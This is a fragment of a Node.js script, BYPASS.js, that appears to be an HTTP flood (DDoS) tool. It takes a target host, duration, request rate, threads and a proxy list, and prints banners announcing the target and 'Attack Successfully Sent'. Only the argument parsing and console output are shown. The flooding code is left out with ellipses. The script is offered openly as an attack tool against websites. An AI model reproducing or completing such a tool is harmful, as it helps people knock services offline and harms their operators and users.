...
const colors = require('colors');
 ...
 if (process.argv.length < 7){console.log('@zaibuzaiii\n node BYPASS.js <host> <time> <rps> <threads> <proxyfile>'); process.exit();}
 const headers = {};
...
if (cluster.isMaster) {
 ...
 console.log(`    ${'TARGET'.red}   ${':'.red}   ${'['.red} https://` + parsedTarget.host + ` ${']'.red}
    ${'PORT'.red}     ${':'.red}   ${'['.red} ${'443'.white} ${']'.red}
    ${'TIME'.red}     ${':'.red}   ${'['.red} ` + args.time + ` ${']'.red}`)
    console.log(` [ Attack Details ]`.white)
    console.log(`    ${'Status'.red}   ${':'.red}   ${'['.red} ${'Attack Successfully Sent'.white.italic} ${']'.red}
    ${'METHOD'.red}   ${':'.red}   ${'['.red} ${`BYPASS`.white} ${']'.red}
